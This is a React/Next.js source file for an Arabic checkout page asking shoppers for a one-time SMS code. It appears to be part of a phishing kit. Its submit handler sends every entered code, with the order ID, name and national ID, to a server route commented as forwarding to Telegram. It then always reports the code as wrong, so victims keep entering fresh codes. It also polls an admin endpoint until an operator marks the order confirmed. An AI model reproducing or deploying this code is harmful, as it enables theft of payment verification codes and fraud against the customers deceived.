"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { IoShieldCheckmarkOutline, IoPhonePortraitOutline, IoRefreshOutline, IoArrowForwardOutline, IoCloseCircleOutline, IoDocumentTextOutline, IoReceiptOutline, IoCloseOutline } from "react-icons/io5";
import CheckoutStepper from "../../components/CheckoutStepper";

export default function VerifyPage() {
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [wrongCode, setWrongCode] = useState(false);
  const [resent, setResent] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(60);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(cooldownRef.current!);
  }, []);

  function startCooldown() {
    clearInterval(cooldownRef.current!);
    setResendCooldown(60);
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
  const savedName = typeof window !== "undefined" ? localStorage.getItem("customerName") ?? "—" : "—";
  const customerName = customer?.name || savedName;

  useEffect(() => {
    if (!dbOrderId) return;
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  }, [dbOrderId]);



  async function handleSubmit() {
    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }
    const submittedCode = code;

    // Send to telegram immediately
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: submittedCode, orderId, customerName, customerId: customer?.nationalId ?? "—" }),
    });

    // Show wrong code error immediately
    setWrongCode(true);
    setCode("");

    // 5 second cooldown before they can submit again
    setSubmitCooldown(5);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown(prev => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);

    try {
      const res = await fetch("/api/admin/orders");
      const orders = await res.json();
      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === orderId) : null;
      if (match) setDbOrderId(match._id);
    } catch {}
  }

  // ── Confirmed Popup ──
  if (confirmed && dbOrderId) {
    return (
      <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
        <div className="relative bg-white rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md overflow-hidden" style={{ border: "1px solid rgba(188,146,85,0.2)" }}>
          <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full transition z-10" style={{ backgroundColor: "rgba(188,146,85,0.1)" }}>
            <IoCloseOutline size={18} style={{ color: "#A77D4B" }} />
          </Link>
          <div className="flex flex-col items-center pt-6 pb-3">
            <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 object-contain" />
            <span className="mt-3 text-sm font-bold px-5 py-1.5 rounded-full shadow-md" style={{ backgroundColor: "#BC9255", color: "#fff" }}>
              نجحت عملية الدفع
            </span>
          </div>
          <div className="px-5 py-4 flex flex-col gap-3 text-center">
            <div className="space-y-2">
              <p className="font-bold text-base" style={{ color: "#0A1825" }}>تمت العملية بنجاح</p>
              <p className="text-sm leading-7" style={{ color: "#A77D4B" }}>
                شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا، ونتمنى أن نكون عند حسن ظنكم وتوقعاتكم.
              </p>
              <p className="text-sm" style={{ color: "#A77D4B" }}>يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
            </div>
            <div className="flex gap-3 pb-1">
              <a href={`/admin/orders/${dbOrderId}/print`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl font-semibold text-sm shadow-md"
                style={{ backgroundColor: "#BC9255", color: "#fff" }}>
                <IoDocumentTextOutline size={16} /> الفاتورة
              </a>
              <a href={`/admin/orders/${dbOrderId}/receipt`} target="_blank" rel="noopener noreferrer"
                className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl font-semibold text-sm shadow-md"
                style={{ backgroundColor: "#0A1825", color: "#BC9255" }}>
                <IoReceiptOutline size={16} /> سند القبض
              </a>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ── OTP Form ──
  return (
    <main className="min-h-screen flex flex-col items-center justify-center px-4 sm:px-6 py-10" dir="rtl" style={{ background: "linear-gradient(to bottom, #ffffff, #f5f0e8)" }}>
      {/* Steps */}
      <div className="w-full max-w-lg mb-2">
        <CheckoutStepper active="confirm" />
      </div>

      <div className="w-full max-w-lg">
        {/* Card */}
        <div className="rounded-3xl overflow-hidden" style={{ backgroundColor: "#fff", border: "1px solid rgba(188,146,85,0.15)", boxShadow: "0 8px 32px rgba(188,146,85,0.08)" }}>

          {/* Top illustration area */}
          <div className="relative py-8 flex flex-col items-center" style={{ backgroundColor: "#faf7f2" }}>
            <div className="relative">
              <div
                className="w-20 h-20 rounded-2xl flex items-center justify-center transition-all"
                style={{
                  backgroundColor: wrongCode ? "rgba(239,68,68,0.06)" : "#fff",
                  border: wrongCode ? "2px solid rgba(239,68,68,0.3)" : "2px solid rgba(188,146,85,0.2)",
                  boxShadow: wrongCode ? "0 4px 16px rgba(239,68,68,0.1)" : "0 4px 16px rgba(188,146,85,0.1)",
                }}
              >
                {wrongCode ? (
                  <IoCloseCircleOutline size={36} className="text-red-500" />
                ) : (
                  <IoPhonePortraitOutline size={36} style={{ color: "#BC9255" }} />
                )}
              </div>
              {!wrongCode && (
                <div className="absolute -top-1 -right-1 w-6 h-6 rounded-full flex items-center justify-center" style={{ backgroundColor: "#BC9255" }}>
                  <IoShieldCheckmarkOutline size={14} style={{ color: "#fff" }} />
                </div>
              )}
            </div>
            <h2 className="mt-4 text-lg font-black" style={{ color: wrongCode ? "#ef4444" : "#0A1825" }}>
              {wrongCode ? "الرمز غير صحيح" : "التحقق من الهوية"}
            </h2>
            <p className="text-xs mt-1" style={{ color: wrongCode ? "rgba(239,68,68,0.7)" : "#A77D4B" }}>
              {wrongCode ? "حاول مرة أخرى" : "أدخل الرمز المرسل إلى جوالك"}
            </p>
          </div>

          {/* Form area */}
          <div className="p-5 sm:p-7 space-y-6">

            {/* OTP Input */}
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              value={code}
              onChange={e => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); setWrongCode(false); }}
              placeholder="أدخل الرمز"
              className="w-full text-center text-2xl sm:text-3xl font-black tracking-[0.3em] rounded-xl px-4 py-4 outline-none transition-all"
              style={{
                backgroundColor: "#faf7f2",
                border: wrongCode ? "2px solid #ef4444" : code ? "2px solid #BC9255" : "2px solid rgba(188,146,85,0.15)",
                color: "#0A1825",
              }}
            />

            {/* Error messages */}
            {codeError && (
              <div className="flex items-center justify-center gap-1.5">
                <IoCloseCircleOutline size={14} className="text-red-500" />
                <p className="text-red-500 text-xs font-bold">أدخل 4 أو 6 أرقام</p>
              </div>
            )}

            {wrongCode && (
              <div className="flex items-center justify-center gap-1.5 px-4 py-2 rounded-lg" style={{ backgroundColor: "rgba(239,68,68,0.06)", border: "1px solid rgba(239,68,68,0.15)" }}>
                <IoCloseCircleOutline size={16} className="text-red-500" />
                <p className="text-red-500 text-sm font-bold">الرمز غير صحيح، حاول مرة أخرى</p>
              </div>
            )}
            {resent && (
              <div className="flex items-center justify-center gap-1.5">
                <IoShieldCheckmarkOutline size={14} style={{ color: "#BC9255" }} />
                <p className="text-xs font-bold" style={{ color: "#BC9255" }}>تم إعادة إرسال الرمز</p>
              </div>
            )}

            {/* Info text */}
            <p className="text-center text-[11px]" style={{ color: "rgba(167,125,75,0.6)" }}>
              لم يصلك الرمز؟ تحقق من الرسائل أو انتظر بضع دقائق
            </p>

            {/* Buttons */}
            <div className="space-y-3">
              <button
                onClick={handleSubmit}
                disabled={submitCooldown > 0}
                className="w-full py-4 rounded-xl font-black text-sm transition-all active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed"
                style={{ backgroundColor: "#BC9255", color: "#fff", boxShadow: "0 4px 16px rgba(188,146,85,0.3)" }}
              >
                {submitCooldown > 0 ? `انتظر ${submitCooldown} ثانية...` : "تأكيد الرمز"}
              </button>

              <div className="grid grid-cols-2 gap-3">
                <button
                  disabled={resendCooldown > 0}
                  onClick={() => {
                    fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                    setResent(true);
                    setWrongCode(false);
                    setTimeout(() => setResent(false), 3000);
                    startCooldown();
                  }}
                  className="flex items-center justify-center gap-1.5 py-3 rounded-xl text-xs font-bold transition-all disabled:opacity-40 disabled:cursor-not-allowed"
                  style={{ backgroundColor: "rgba(188,146,85,0.06)", color: "#A77D4B", border: "1px solid rgba(188,146,85,0.15)" }}
                >
                  <IoRefreshOutline size={14} />
                  {resendCooldown > 0 ? `${resendCooldown}ث` : "إعادة إرسال"}
                </button>

                <Link
                  href="/checkout"
                  className="flex items-center justify-center gap-1.5 py-3 rounded-xl text-xs font-bold transition hover:opacity-80"
                  style={{ backgroundColor: "rgba(10,24,37,0.04)", color: "#0A1825", border: "1px solid rgba(10,24,37,0.08)" }}
                >
                  <IoArrowForwardOutline size={14} />
                  رجوع
                </Link>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}
